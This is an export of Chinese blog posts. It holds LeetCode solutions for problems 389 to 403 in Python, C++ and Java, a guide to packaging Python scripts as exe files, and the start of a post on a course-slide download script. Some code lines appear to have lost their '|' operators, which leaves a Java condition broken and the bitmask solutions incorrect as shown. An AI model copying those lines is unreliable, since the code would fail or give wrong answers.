&quot;&quot;&quot; :type rectangles: List[List[int]] :rtype: bool &quot;&quot;&quot; m = collections.defaultdict(int) min_x = min_y = 0x7fffffff max_x = max_y = 0 area = 0 for rec in rectangles: min_x = min(min_x, rec[0]) min_y = min(min_y, rec[1]) max_x = max(max_x, rec[2]) max_y = max(max_y, rec[3]) area += (rec[3] - rec[1]) * (rec[2] - rec[0]) if self.check(m, str(rec[0]) + &#x27;,&#x27; + str(rec[1]), 1): return False if self.check(m, str(rec[2]) + &#x27;,&#x27; + str(rec[1]), 2): return False if self.check(m, str(rec[2]) + &#x27;,&#x27; + str(rec[3]), 4): return False if self.check(m, str(rec[0]) + &#x27;,&#x27; + str(rec[3]), 8): return False cnt = 0 for value in m.values(): if value == 1 or value == 2 or value == 4 or value == 8: cnt += 1 return cnt == 4 and area == (max_y - min_y) * (max_x - min_x) def check(self, m, key, mask): if m[key] &amp; mask: return True m[key] = mask return False 下面的这种方法从上面的改进，由于绿色出现2次，红色4次，那么用一个Hash记录即可，若当前点不存在，添加，存在则删除。最后剩下的只可能是4个蓝色的点，并且总面积要相等。 Python 123456789101112131415161718192021222324252627282930313233class Solution(object): def isRectangleCover(self, rectangles): &quot;&quot;&quot; :type rectangles: List[List[int]] :rtype: bool &quot;&quot;&quot; m = set() min_x = min_y = 0x7fffffff max_x = max_y = 0 area = 0 for rec in rectangles: min_x = min(min_x, rec[0]) min_y = min(min_y, rec[1]) max_x = max(max_x, rec[2]) max_y = max(max_y, rec[3]) area += (rec[3] - rec[1]) * (rec[2] - rec[0]) a = str(rec[0]) + &#x27;,&#x27; + str(rec[1]) b = str(rec[2]) + &#x27;,&#x27; + str(rec[1]) c = str(rec[2]) + &#x27;,&#x27; + str(rec[3]) d = str(rec[0]) + &#x27;,&#x27; + str(rec[3]) for x in (a, b, c, d): if x in m: m.remove(x) else: m.add(x) a = str(min_x) + &#x27;,&#x27; + str(min_y) b = str(min_x) + &#x27;,&#x27; + str(max_y) c = str(max_x) + &#x27;,&#x27; + str(min_y) d = str(max_x) + &#x27;,&#x27; + str(max_y) for x in (a, b, c, d): if x not in m: return False return len(m) == 4 and area == (max_y - min_y) * (max_x - min_x) 392. Is Subsequence Given a string s and a string t, check if s is subsequence of t. You may assume that there is only lower case English letters in both s and t. t is potentially a very long (length ~= 500,000) string, and s is a short string (&lt;=100). A subsequence of a string is a new string which is formed from the original string by deleting some (can be none) of the characters without disturbing the relative positions of the remaining characters. (ie, \"ace\" is a subsequence of \"abcde\" while \"aec\" is not). Example 1: s = \"abc\", t = \"ahbgdc\" Return true. Example 2: s = \"axc\", t = \"ahbgdc\" Return false. Follow up: If there are lots of incoming S, say S1, S2, ... , Sk where k &gt;= 1B, and you want to check one by one to see if T has its subsequence. In this scenario, how would you change your code? 传送门：leetcode Is Subsequence 题意：给定字符串s和很长的字符串t，判断s是否是t的子串。比如ace是abcde子串，而aec不是。 思路：双指针，一个指向s一个指向t，当s[i] == t[j]则 继续判断s的下一个字符和j之后的是否匹配。这样的正确性在于as是b的子串，它的相对顺序是不变的。 C++ 123456789101112class Solution &#123;public: bool isSubsequence(string s, string t) &#123; if (s.size() &gt; t.size()) return false; int i = 0, j = 0, n = s.size(),m = t.size(); for (; i &lt; n &amp;&amp; j &lt; m;j++) &#123; if (s[i] == t[j]) i++; &#125; return i == n; &#125;&#125;; Java 123456789101112class Solution &#123; public boolean isSubsequence(String s, String t) &#123; if (s.length() &gt; t.length() s.length() == t.length() &amp;&amp; !s.equals(t)) return false; int i = 0, j = 0; int n = s.length(), m = t.length(); for (; i &lt; n &amp;&amp; j &lt; m; j++) &#123; if (s.charAt(i) == t.charAt(j)) i++; &#125; return i == n; &#125;&#125; Python 1234567891011121314class Solution(object): def isSubsequence(self, s, t): &quot;&quot;&quot; :type s: str :type t: str :rtype: bool &quot;&quot;&quot; if len(s) &gt; len(t): return False i = j = 0 while i &lt; len(s) and j &lt; len(t): if s[i] == t[j]: i += 1 j += 1 return i == len(s) 393. UTF-8 Validation A character in UTF8 can be from 1 to 4 bytes long, subjected to the following rules: For 1-byte character, the first bit is a 0, followed by its unicode code. For n-bytes character, the first n-bits are all one's, the n+1 bit is 0, followed by n-1 bytes with most significant 2 bits being 10. This is how the UTF-8 encoding would work: 1234567Char. number range UTF-8 octet sequence (hexadecimal) (binary) --------------------+--------------------------------------------- 0000 0000-0000 007F 0xxxxxxx 0000 0080-0000 07FF 110xxxxx 10xxxxxx 0000 0800-0000 FFFF 1110xxxx 10xxxxxx 10xxxxxx 0001 0000-0010 FFFF 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx Given an array of integers representing the data, return whether it is a valid utf-8 encoding. Note: The input is an array of integers. Only the least significant 8 bits of each integer is used to store the data. This means each integer represents only 1 byte of data. Example 1: 123456data &#x3D; [197, 130, 1], which represents the octet sequence: 11000101 10000010 00000001.Return true.It is a valid utf-8 encoding for a 2-bytes character followed by a 1-byte character. Example 2: 12345678data &#x3D; [235, 140, 4], which represented the octet sequence: 11101011 10001100 00000100.Return false.The first 3 bits are all one&#39;s and the 4th bit is 0 means it is a 3-bytes character.The next byte is a continuation byte which starts with 10 and that&#39;s correct.But the second continuation byte does not start with 10, so it is invalid. 传送门：leetcode UTF-8 Validation 题意：给定一个数组，数组中每个数字为UTF8的4个byte的编码。判断该数组是否是合法的UTF-8序列。合法的序列如下表。 1234567Char. number range UTF-8 octet sequence (hexadecimal) (binary) --------------------+--------------------------------------------- 0000 0000-0000 007F 0xxxxxxx 0000 0080-0000 07FF 110xxxxx 10xxxxxx 0000 0800-0000 FFFF 1110xxxx 10xxxxxx 10xxxxxx 0001 0000-0010 FFFF 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx 比如以1110开头的，后面需要有2个10开头的数字。 思路：直接扫描判断需要有几个10开头的数字即可，然后看看是否足够。 Python 123456789101112131415161718192021222324252627282930class Solution(object): def validUtf8(self, data): &quot;&quot;&quot; :type data: List[int] :rtype: bool &quot;&quot;&quot; n = len(data) i = 0 def check(s, k, n): if s + k &gt; n: return False for i in range(s + 1, s + k): if (data[i] &gt;&gt; 6) != 0b10: return False return True while i &lt; n: if (data[i] &gt;&gt; 3) == 0b11110: step = 4 elif (data[i] &gt;&gt; 4) == 0b1110: step = 3 elif (data[i] &gt;&gt; 5) == 0b110: step = 2 elif (data[i] &gt;&gt; 7) == 0b0: step = 1 else: return False if not check(i, step, n): return False i += step return True 394. Decode String Given an encoded string, return it's decoded string. The encoding rule is: k[encoded_string], where the encoded_string inside the square brackets is being repeated exactly k times. Note that k is guaranteed to be a positive integer. You may assume that the input string is always valid; No extra white spaces, square brackets are well-formed, etc. Furthermore, you may assume that the original data does not contain any digits and that digits are only for those repeat numbers, k. For example, there won't be input like 3a or 2[4]. Examples: 123s &#x3D; &quot;3[a]2[bc]&quot;, return &quot;aaabcbc&quot;.s &#x3D; &quot;3[a2[c]]&quot;, return &quot;accaccacc&quot;.s &#x3D; &quot;2[abc]3[cd]ef&quot;, return &quot;abcabccdcdcdef&quot;. 传送门：leetcode Decode String 题意：给定一个缩略表示法的字符串，要求将其展开。比如s = \"3[a]表示有3个a 应该展开为aaa。题目保证输入串合法，无额外的空格。 思路：用栈，碰到数字就算一下，碰到字母就放进当前的字符串，碰到[则压入栈，碰到]则从栈顶弹出并更新当前字符串。 Python 1234567891011121314151617181920212223class Solution(object): def decodeString(self, s): &quot;&quot;&quot; :type s: str :rtype: str &quot;&quot;&quot; q = [] cur = &#x27;&#x27; repeat = 0 for c in s: if c == &#x27;[&#x27;: q.append([repeat, cur]) repeat = 0 cur = &#x27;&#x27; elif c == &#x27;]&#x27;: t = q.pop() cur = t[1] + cur * t[0] repeat = 0 elif c.isdigit(): repeat = repeat * 10 + int(c) else: cur += c return cur 395. Longest Substring with At Least K Repeating Characters Find the length of the longest substring T of a given string (consists of lowercase letters only) such that every character in T appears no less than k times. Example 1: 1234567Input:s &#x3D; &quot;aaabb&quot;, k &#x3D; 3Output:3The longest substring is &quot;aaa&quot;, as &#39;a&#39; is repeated 3 times. Example 2: 1234567Input:s &#x3D; &quot;ababbc&quot;, k &#x3D; 2Output:5The longest substring is &quot;ababb&quot;, as &#39;a&#39; is repeated 2 times and &#39;b&#39; is repeated 3 times. 传送门：leetcode Longest Substring with At Least K Repeating Characters 题意：给定一个字符串s和k，求字符串最长的子串T，在T中的所有字符至少出现k次。 思路: 枚举起点和终点，对于满足条件的进行计算。(貌似还可以分治？过阵子看看) Python 12345678910111213141516171819202122232425class Solution(object): def longestSubstring(self, s, k): &quot;&quot;&quot; :type s: str :type k: int :rtype: int &quot;&quot;&quot; max_len =i= 0 n = len(s) while i + k &lt;= n: cnt = [0] * 26 max_last = i for j in range(i, n): _id = ord(s[j]) - 97 cnt[_id] += 1 flag = True for cur_cnt in cnt: if cur_cnt != 0 and cur_cnt &lt; k: flag = False break if flag: max_len = max(max_len, j - i + 1) max_last = j i = max_last + 1 return max_len 但是由于是小写字母，所以可以用位运算来快速的判断是否符合条件。（上面的是每次扫整个hash表） Python 1234567891011121314151617181920212223class Solution(object): def longestSubstring(self, s, k): &quot;&quot;&quot; :type s: str :type k: int :rtype: int &quot;&quot;&quot; max_len = i = 0 n = len(s) while i + k &lt;= n: max_last = i cnt = [0] * 26 mask = 0 for j in range(i, n): _id = ord(s[j]) - 97 cnt[_id] += 1 if cnt[_id] &lt; k: mask = (1 &lt;&lt; _id) else: mask &amp;= ~(1 &lt;&lt; _id) if mask == 0: max_len = max(max_len, j - i + 1) max_last = j i = max_last + 1 return max_len C++ 123456789101112131415161718192021222324class Solution &#123;public: int longestSubstring(string s, int k) &#123; int max_len = 0; for (int first = 0; first+k &lt;= s.size();) &#123; int count[26] = &#123;0&#125;; int mask = 0; int max_last = first; for (int last = first; last &lt; s.size(); ++last) &#123; int i = s[last] - &#x27;a&#x27;; count[i]++; if (count[i]&lt;k) mask = (1 &lt;&lt; i); else mask &amp;= (~(1 &lt;&lt; i)); if (mask == 0) &#123; max_len = max(max_len, last-first+1); max_last = last; &#125; &#125; first = max_last + 1; &#125; return max_len; &#125;&#125;; 396. Rotate Function Given an array of integers A and let n to be its length. Assume Bk to be an array obtained by rotating the array A k positions clock-wise, we define a \"rotation function\" F on A as follow: F(k) = 0 * Bk[0] + 1 * Bk[1] + ... + (n-1) * Bk[n-1]. Calculate the maximum value of F(0), F(1), ..., F(n-1). Note: n is guaranteed to be less than 105. Example: 12345678A &#x3D; [4, 3, 2, 6]F(0) &#x3D; (0 * 4) + (1 * 3) + (2 * 2) + (3 * 6) &#x3D; 0 + 3 + 4 + 18 &#x3D; 25F(1) &#x3D; (0 * 6) + (1 * 4) + (2 * 3) + (3 * 2) &#x3D; 0 + 4 + 6 + 6 &#x3D; 16F(2) &#x3D; (0 * 2) + (1 * 6) + (2 * 4) + (3 * 3) &#x3D; 0 + 6 + 8 + 9 &#x3D; 23F(3) &#x3D; (0 * 3) + (1 * 2) + (2 * 6) + (3 * 4) &#x3D; 0 + 2 + 12 + 12 &#x3D; 26So the maximum value of F(0), F(1), F(2), F(3) is F(3) &#x3D; 26. 传送门：leetcode Rotate Function 题意：给定数组A, 将A进行循环右移，每次分别计算 F(k) = 0 * Bk[0] + 1 * Bk[1] + ... + (n-1) * Bk[n-1].（B为循环右移K次的值），求max(F(k)) 思路：先求出和以及F(0)。 然后每次循环右移的时候，显然是上一次的结果+s - n*A[i]（这个已经到第0个位置，清除掉） Python 1234567891011121314151617class Solution(object): def maxRotateFunction(self, A): &quot;&quot;&quot; :type A: List[int] :rtype: int &quot;&quot;&quot; max_f = s = 0 for i, x in enumerate(A): max_f += i * x s += x n = len(A) last = max_f for i in range(n - 1, -1, -1): last = last + s - n * A[i] max_f = max(max_f,last) return max_f 397. Integer Replacement Given a positive integer n and you can do operations as follow: If n is even, replace n with _n_/2. If n is odd, you can replace n with either _n_ + 1 or _n_ - 1. What is the minimum number of replacements needed for n to become 1? Example 1: 12345678Input:8Output:3Explanation:8 -&gt; 4 -&gt; 2 -&gt; 1 Example 2: 12345678910Input:7Output:4Explanation:7 -&gt; 8 -&gt; 4 -&gt; 2 -&gt; 1or7 -&gt; 6 -&gt; 3 -&gt; 2 -&gt; 1 传送门：leetcode Integer Replacement 题意：给定一个数n，若n为奇数可以加一或者减一，若n为偶数，则/2，求把它变为1至少需要几步？ 思路：直接递归暴力求值。 Python 1234567891011class Solution(object): def integerReplacement(self, n): &quot;&quot;&quot; :type n: int :rtype: int &quot;&quot;&quot; if n == 1: return 0 if n &amp; 1: return min(self.integerReplacement(n + 1), self.integerReplacement(n - 1)) + 1 else: return self.integerReplacement(n &gt;&gt; 1) + 1 要让其有最少的步数，就要尽量在n为奇数的时候减少1的个数。 例如15，二进制为1111 1111-&gt;10000-&gt;1000-&gt;100-&gt;10-&gt;1 1111-&gt;1110-&gt;111-&gt;110-&gt;11-&gt;10-&gt;1 如果一个数以0b11结尾，那么，+1显然是更好的选择（因为加一会至少消掉2个1），否则可以-1。当然，3是例外。 Python 1234567891011121314151617class Solution(object): def integerReplacement(self, n): &quot;&quot;&quot; :type n: int :rtype: int &quot;&quot;&quot; cnt = 0 while n != 1: cnt += 1 if n &amp; 1: if (n + 1) &amp; 0b11 == 0 and n != 3: # (n+1) %4 ==0 n += 1 else: n -= 1 else: n &gt;&gt;= 1 return cnt 398. Random Pick Index Given an array of integers with possible duplicates, randomly output the index of a given target number. You can assume that the given target number must exist in the array. Note: The array size can be very large. Solution that uses too much extra space will not pass the judge. Example: 12345678int[] nums &#x3D; new int[] &#123;1,2,3,3,3&#125;;Solution solution &#x3D; new Solution(nums);&#x2F;&#x2F; pick(3) should return either index 2, 3, or 4 randomly. Each index should have equal probability of returning.solution.pick(3);&#x2F;&#x2F; pick(1) should return 0. Since in the array only nums[0] is equal to 1.solution.pick(1); 传送门：leetcode Random Pick Index 题意：给定一个数组，每次给定一个数x，要求随机返回数组中x的下标（等概率） 思路：用hash + list MLE了。 那就类似于之前的 382. Linked List Random Node。 扫描数组，若当前数字等于x，则有 1/cnt的概率取代它（cnt为当前出现了多少次x） Python 123456789101112131415161718192021class Solution(object): def __init__(self, nums): &quot;&quot;&quot; :type nums: List[int] :type numsSize: int &quot;&quot;&quot; self.nums = nums def pick(self, target): &quot;&quot;&quot; :type target: int :rtype: int &quot;&quot;&quot; cnt = ans = -1 for i, x in enumerate(self.nums): if x == target: cnt += 1 if random.randint(0, cnt) == 0: ans = i return ans 399. Evaluate Division Equations are given in the format A / B = k, where A and B are variables represented as strings, and k is a real number (floating point number). Given some queries, return the answers. If the answer does not exist, return -1.0. Example: Given a / b = 2.0, b / c = 3.0. queries are: a / c = ?, b / a = ?, a / e = ?, a / a = ?, x / x = ? . return [6.0, 0.5, -1.0, 1.0, -1.0 ]. The input is: vector&lt;pair&lt;string, string&gt;&gt; equations, vector&lt;double&gt;&amp; values, vector&lt;pair&lt;string, string&gt;&gt; queries , whereequations.size() == values.size(), and the values are positive. This represents the equations. Return vector&lt;double&gt;. According to the example above: 123equations &#x3D; [ [&quot;a&quot;, &quot;b&quot;], [&quot;b&quot;, &quot;c&quot;] ],values &#x3D; [2.0, 3.0],queries &#x3D; [ [&quot;a&quot;, &quot;c&quot;], [&quot;b&quot;, &quot;a&quot;], [&quot;a&quot;, &quot;e&quot;], [&quot;a&quot;, &quot;a&quot;], [&quot;x&quot;, &quot;x&quot;] ]. The input is always valid. You may assume that evaluating the queries will result in no division by zero and there is no contradiction. 传送门：leetcode Evaluate Division 题意：给定一些表达式和它对应的值，然后要求求解一些表达式的值，如果不存在则返回-1. 思路： 用图的思想来做。对于x/y = v，建立(x,y,v)和(y,x,1/v)两条边，表示x-&gt;y值为v，y-&gt;x值为1/v，（v!=0) 对于求解a/b，若有解，我们只需要能找到这样的路径，从a出发，经过若干个点之后，到达b。 则它们路途中的值相称就是对应的解。 比如有边(a,c) (c,d) (d,b) 表示a/c ，c/d， d/b，相乘即可。 于是建立好图之后，进行DFS，并沿路求积。 Python 123456789101112131415161718192021222324252627282930313233343536373839class Solution(object): def calcEquation(self, equations, values, queries): &quot;&quot;&quot; :type equations: List[List[str]] :type values: List[float] :type queries: List[List[str]] :rtype: List[float] &quot;&quot;&quot; edges = collections.defaultdict(list) _id = 0 for i, (x, y) in enumerate(equations): edges[x].append((_id, y, values[i])) _id += 1 if values[i] != 0: edges[y].append((_id, x, 1.0 / values[i])) _id += 1 ans = [] vis = [False] * (_id + 1) for x, y in queries: if x not in edges or y not in edges: ans.append(-1.0) elif x == y: ans.append(1.0) else: t = self.dfs(1, x, y, edges, vis) ans.append(t if t else -1.0) return ans def dfs(self, val, _from, _to, edges, vis): for _id, y, c_val in edges[_from]: if vis[_id]: continue if y == _to: return val * c_val vis[_id] = True t = self.dfs(val * c_val, y, _to, edges, vis) vis[_id] = False if t: return t return None 这是leetcode 389~399的题解，更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode contest 5 solution","slug":"leetcode-contest-5-solution","date":"2016-09-19T06:44:20.000Z","updated":"2020-12-20T05:28:03.090Z","comments":true,"path":"leetcode-contest-5-solution/","link":"","permalink":"https://www.hrwhisper.me/leetcode-contest-5-solution/","excerpt":"本次题解包括： 400 Nth Digit 401 Binary Watch 402 Remove K Digits 403 Frog Jump","text":"本次题解包括： 400 Nth Digit 401 Binary Watch 402 Remove K Digits 403 Frog Jump leetcode 400. Nth Digit Find the _n_th digit of the infinite integer sequence 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, ... Note: n is positive and will fit within the range of a 32-bit signed integer (n &lt; 231). Example 1: 12345Input:3Output:3 Example 2: 12345678Input:11Output:0Explanation:The 11th digit of the sequence 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, ... is a 0, which is part of the number 10. 传送门：leetcode Nth Digit 题意：给定一个数字n，求从1开始的整数中，第n个字母 思路：主要是求出该数字需要的位数，因为一位数有9*1，两位数有90*2​，三位数有900*3以此类推。剩下的直接看看是否整除啥的即可。 1234567891011121314151617class Solution(object): def findNthDigit(self, n): &quot;&quot;&quot; :type n: int :rtype: int &quot;&quot;&quot; num = 9 cnt = 1 while n &gt; num * cnt: n -= (num * cnt) num *= 10 cnt += 1 t = n // cnt base = 10 ** (cnt - 1) + t if t * cnt == n: return (base - 1) % 10 n -= t * cnt return int(str(base)[::-1][-n]) leetcode 401. Binary Watch A binary watch has 4 LEDs on the top which represent the hours (0-11), and the 6 LEDs on the bottom represent the minutes (0-59). Each LED represents a zero or one, with the least significant bit on the right. For example, the above binary watch reads \"3:25\". Given a non-negative integer n which represents the number of LEDs that are currently on, return all possible times the watch could represent. Example: 12Input: n &#x3D; 1Return: [&quot;1:00&quot;, &quot;2:00&quot;, &quot;4:00&quot;, &quot;8:00&quot;, &quot;0:01&quot;, &quot;0:02&quot;, &quot;0:04&quot;, &quot;0:08&quot;, &quot;0:16&quot;, &quot;0:32&quot;] Note: The order of output does not matter. The hour must not contain a leading zero, for example \"01:00\" is not valid, it should be \"1:00\". The minute must be consist of two digits and may contain a leading zero, for example \"10:2\" is not valid, it should be \"10:02\". 传送门：leetcode Binary Watch 题意：给定一个二进制的表，让你求时间。其中，用1，2，4，8 表示小时，1，2，4，8，16，32表示分钟。给定n，让你求在n盏灯亮的情况下，可以表示的所有时间。 思路：可以直接DFS，注意小时&lt;12,分钟&lt;60。感觉可以位运算，过阵子再看看。 12345678910111213141516171819202122232425262728293031class Solution(object): def readBinaryWatch(self, num): &quot;&quot;&quot; :type num: int :rtype: List[str] &quot;&quot;&quot; hour = [1, 2, 4, 8] minute = [1, 2, 4, 8, 16, 32] _time = hour + minute res = [] self.dfs(0, 0, [0, 0], _time, len(hour), num, res) ans = [] for h, m in res: ans.append(str(h) + &quot;:&quot; + str(m).zfill(2)) return ans def dfs(self, j, cnt, cur, _time, time_len, k, ans): if cnt == k: ans.append(cur[:]) return for i in range(j, len(_time)): if i &lt; time_len: cur[0] += _time[i] if cur[0] &lt; 12: self.dfs(i + 1, cnt + 1, cur, _time, time_len, k, ans) cur[0] -= _time[i] else: cur[1] += _time[i] if cur[1] &lt; 60: self.dfs(i + 1, cnt + 1, cur, _time, time_len, k, ans) cur[1] -= _time[i] leetcode 402. Remove K Digits Given a non-negative integer num represented as a string, remove k digits from the number so that the new number is the smallest possible. Note: The length of num is less than 10002 and will be ≥ k. The given num does not contain any leading zero. Example 1: 1234Input: num &#x3D; &quot;1432219&quot;, k &#x3D; 3Output: &quot;1219&quot;Explanation: Remove the three digits 4, 3, and 2 to form the new number 1219 which is the smallest. Example 2: 1234Input: num &#x3D; &quot;10200&quot;, k &#x3D; 1Output: &quot;200&quot;Explanation: Remove the leading 1 and the number is 200. Note that the output must not contain leading zeroes. Example 3: 123Input: num &#x3D; &quot;10&quot;, k &#x3D; 2Output: &quot;0&quot;Explanation: Remove all the digits from the number and it is left with nothing which is 0. 传送门：leetcode Remove K Digits 题意：给定一个num（字符串）和k，让你从num中删除k个字符使得整个字符串值最大。 思路：用栈。保证栈里的元素比较小即可。类似于leetcode Remove Duplicate Letters 以及 leetcode Create Maximum Number 1234567891011121314151617class Solution(object): def removeKdigits(self, num, k): &quot;&quot;&quot; :type num: str :type k: int :rtype: str &quot;&quot;&quot; n = len(num) remain = n - k if remain &lt;= 0: return &#x27;0&#x27; s = [] for i in range(n): while s and s[-1] &gt; num[i] and len(s) + n - i &gt; remain: s.pop() s.append(num[i]) if len(s) &gt; n - k: s = s[:-k] return &#x27;&#x27;.join(s).lstrip(&#x27;0&#x27;) or &#x27;0&#x27; leetcode 403. Frog Jump A frog is crossing a river. The river is divided into x units and at each unit there may or may not exist a stone. The frog can jump on a stone, but it must not jump into the water. Given a list of stones' positions (in units) in sorted ascending order, determine if the frog is able to cross the river by landing on the last stone. Initially, the frog is on the first stone and assume the first jump must be 1 unit. If the frog's last jump was k units, then its next jump must be either k - 1, k, or k + 1 units. Note that the frog can only jump in the forward direction. Note: The number of stones is ≥ 2 and is &lt; 1,100. Each stone's position will be a non-negative integer &lt; 231. The first stone's position is always 0. Example 1: 1234567891011[0,1,3,5,6,8,12,17]There are a total of 8 stones.The first stone at the 0th unit, second stone at the 1st unit,third stone at the 3rd unit, and so on...The last stone at the 17th unit.Return true. The frog can jump to the last stone by jumping 1 unit to the 2nd stone, then 2 units to the 3rd stone, then 2 units to the 4th stone, then 3 units to the 6th stone, 4 units to the 7th stone, and 5 units to the 8th stone. Example 2: 1234[0,1,2,3,4,8,9,11]Return false. There is no way to jump to the last stone as the gap between the 5th and 6th stone is too large. 传送门：leetcode Frog Jump 题意：给定一个数组，要你从第一个位置到最后一个位置。（第一个位置总是0，第一步为1），当前跳了k步，那么下一次只能k+1,k,或者k-1步，问是否能从第一个位置到最后一个位置。 思路： 青蛙过河，上一次跳k长度，下一次只能跳k-1,k或者k+1。 因此对于到达了某一个点，我们可以查看其上一次是从哪个点跳过来的。 设dp[ j ][ i ] 为从i到达j 的步数，初始时把所有的石头存放进hash表。然后设置dp[0][0] = 0. 接着对于每个石头，从可以到达该石头的所有石头中取出步数k（k &gt; 0），然后当前的stone + k看其是否是合法的石头，是的话就有d[stone + k ][stone] = k 1234567891011121314class Solution(object): def canCross(self, stones): &quot;&quot;&quot; :type stones: List[int] :rtype: bool &quot;&quot;&quot; dp = &#123;stone: &#123;&#125; for stone in stones&#125; dp[0][0] = 0 for stone in stones: for step in dp[stone].values(): for k in [step + 1, step, step - 1]: if k &gt; 0 and stone + k in dp: dp[stone + k][stone] = k return len(dp[stones[-1]].keys()) &gt; 0 另一种写法 设dp[j][i] 从i可以到达j，因此，对于点 j，我们只需要查看可以从哪个地方跳转过来（这里假设为i），然后查看其跳跃的距离\\(step = stones[j] - stones[i]\\) , 则下一次的跳的距离为\\(step + 1, step, step - 1\\) ，然后查看下一个点_id存不存在（用Hash），存在将dp[_id][j] 设置为可达 ,若\\(id==n-1\\)，说明到达了对岸。这样复杂度为O(n^2) 直接DP，对于i，把i能到达的放进对应的列表中(如i到达j就把i放入j的可达列表中)，如此循环。 1234567891011121314151617181920212223class Solution(object): def canCross(self, stones): &quot;&quot;&quot; :type stones: List[int] :rtype: bool &quot;&quot;&quot; if len(stones) == 2: return stones[1] == 1 n = len(stones) val2id = &#123;stone: i for i, stone in enumerate(stones)&#125; dp = collections.defaultdict(set) dp[1].add(0) for j in range(1, n): for i in dp[j]: step = stones[j] - stones[i] for k in [step + 1, step, step - 1]: _next = stones[j] + k _next = val2id.get(_next, j) if _next != j: if _next == n - 1: return True dp[_next].add(j) return False 本次是 leetcode 如下的题解 400 Nth Digit 401 Binary Watch 402 Remove K Digits 403 Frog Jump 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"Python 3.5 打包成exe 方法","slug":"pack-python-3-5-to-exe","date":"2016-09-17T13:33:39.000Z","updated":"2020-10-22T14:23:34.343Z","comments":true,"path":"pack-python-3-5-to-exe/","link":"","permalink":"https://www.hrwhisper.me/pack-python-3-5-to-exe/","excerpt":"如果python写的脚本可以打包成exe的话，那么就不用每次都打开命令行，然后python xxx.py了。 当然也给小白用户更好的使用方法。 本文介绍python 3.5打包成exe的方法。","text":"如果python写的脚本可以打包成exe的话，那么就不用每次都打开命令行，然后python xxx.py了。 当然也给小白用户更好的使用方法。 本文介绍python 3.5打包成exe的方法。 发现支持Python3的主要有如下两个方法： pyinstaller cx-Freeze 推荐前者 pyinstaller 安装简单，直接 pip install pyinstaller 使用方法也很简单 pyinstaller /path/to/yourscript.py 其它说明 如果需要打包成单个文件的话，可以加上- -onefile选项 1pyinstaller &#x2F;path&#x2F;to&#x2F;yourscript.py --onefile 此外，运行exe的机器貌似不需要python 3.5的环境！ 我使用该方法将写的自动下课件的脚本打包完成。 地址：UCAS 课件自动下载 cx-Freeze 安装 我使用的是cx-Freeze来进行打包， 直接进行 pip install cx_Freeze 即可。 这个方法运行exe的机器仍然需要安装python 3.5 环境,下载地址 https://www.python.org/ftp/python/3.5.2/python-3.5.2.exe 创建setup.py 文件 在你的项目下创建setup.py文件，该文件输入如下内容：其中，Executable('main.py') 中main.py是你脚本的文件名。 1234567891011121314151617181920212223# -*- coding: utf-8 -*-# A very simple setup script to create a single executable## hello.py is a very simple &#39;Hello, world&#39; type script which also displays the# environment in which the script runs## Run the build process by running the command &#39;python setup.py build&#39;## If everything works well you should find a subdirectory in the build# subdirectory that contains the files needed to run the script without Pythonfrom cx_Freeze import setup, Executableexecutables &#x3D; [ Executable(&#39;main.py&#39;)]setup(name&#x3D;&#39;hello&#39;, version&#x3D;&#39;0.1&#39;, description&#x3D;&#39;Sample cx_Freeze script&#39;, executables&#x3D;executables ) 打包 接着，只要在命令行中输入： python setup.py build 该命令在该目录下创建build文件夹，里面有打包好的文件。","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"python learning","slug":"study/python-learning","permalink":"https://www.hrwhisper.me/categories/study/python-learning/"},{"name":"开发环境/开发工具","slug":"开发环境-开发工具","permalink":"https://www.hrwhisper.me/categories/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83-%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"},{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"OtherCodes","slug":"code/OtherCodes","permalink":"https://www.hrwhisper.me/categories/code/OtherCodes/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"}]},{"title":"UCAS自动同步课件脚本","slug":"ucas-course-ppt-auto-download","date":"2016-09-17T11:59:40.000Z","updated":"2021-01-08T13:42:14.035Z","comments":true,"path":"ucas_course_ppt_auto_download/","link":"","permalink":"https://www.hrwhisper.me/ucas_course_ppt_auto_download/","excerpt":"Cool Idea 在UCAS进入研一的生活接近两个礼拜，发现老师的课件基本上都上传到课程网站，然后是一节一节给的。这样，每次老师更新课件的时候，我们都得开一下网页，然后看看是不是更新了？（虽然有邮箱提醒，但是这种邮件我都直接忽略的），于是萌生了写个脚本来自动下载的想法。","text":"Cool Idea 在UCAS进入研一的生活接近两个礼拜，发现老师的课件基本上都上传到课程网站，然后是一节一节给的。这样，每次老师更新课件的时候，我们都得开一下网页，然后看看是不是更新了？（虽然有邮箱提醒，但是这种邮件我都直接忽略的），于是萌生了写个脚本来自动下载的想法。 创作过程及难点 首先是进行抓包分析。登录SEP很简单，直接发送了用户密码还有sb=sb参数。 进入SEP后，该系统采用一个特殊的key传递到另个一个系统（比如选课，课程网站等），捕获这个key之后,就可以进入课程网站啦。 然后分别分析每门课的课件的URL。需要注意的是： 有的老师是给出HTML链接，需要进行重定向，而且需要解决给的链接挂掉的情况。 文件夹需要递归下载。（不能单纯的用'.'来判断，有的老师就是没有扩展名的，不知道上传的是什么鬼） 